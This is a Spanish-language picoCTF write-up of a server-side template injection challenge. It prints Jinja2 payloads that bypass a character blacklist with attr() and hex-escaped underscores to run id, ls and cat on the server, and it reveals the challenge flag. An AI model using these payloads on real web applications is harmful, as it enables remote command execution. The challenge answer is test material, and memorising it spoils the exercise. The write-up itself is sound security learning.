
## Descripción

*I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:53507/)!*
## Pistas

*Server Side Template Injection*

*Why is blacklisting characters a bad idea to sanitize input?*

## Solución


```
#Quice hacer lo mismo que en SSTI1 no se pudo porque ahora en las pistas decia que habia una lista negra, ya habi mas seguridad, entonces buscando encontre que

el {{ 7 * 7 }} y darle ok si da el 49, 
si poniamos ```text
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }} obteniamos un stop trying to break me

regresamos y para evadir la lista de bloqueos insertamos:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
el cual si nos permitio seguir, ahora ponemos ls 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
y nos dice que si esta la bandera.
hacemos un cat:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

y la va a mostrar 
# picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
```
picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
## Notas Adicionales 

## Referencias 
http://shape-facility.picoctf.net:53507/
https://aathilducky.com/ssti2-picoctf-walkthrough-web-exploitation-challenge-guide/